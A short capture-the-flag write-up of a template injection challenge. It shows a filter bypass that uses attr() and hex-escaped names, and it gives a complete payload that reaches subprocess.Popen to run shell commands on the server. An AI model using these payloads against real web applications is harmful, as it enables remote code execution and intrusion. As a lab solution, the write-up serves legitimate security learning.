This is a *template injection* challenge.

Challenge description--

![Alt_Text](https://i.imgur.com/ic7coj4.png)

Challenge url--

![Alt_Text](https://i.imgur.com/sDtGnmo.png)

According to the source code, our payload is rendered as template. Let's test with basic payload `{{7*7}}`. It returns 49. 

![Alt_Text](https://i.imgur.com/6G2C9GF.png)

There is also some filters. Since `las,bas,bal` are banned, we can't use `class,base,global`. We can bypass this with `attr()`. Let's check the subclasses `{{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()}}`.

![Alt_Text](https://i.imgur.com/P7Rc64l.png)

I found the index of `<class 'subprocess.Popen'>` at 360. Our final payload -> `{{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()|attr('__getitem__')(360)("cat flag.txt",shell=True,stdout=-1)|attr('communicate')()}}`.

![Alt_Text](https://i.imgur.com/xelQWh5.png)

Thank you for reading! :cowboy_hat_face: :cowboy_hat_face:



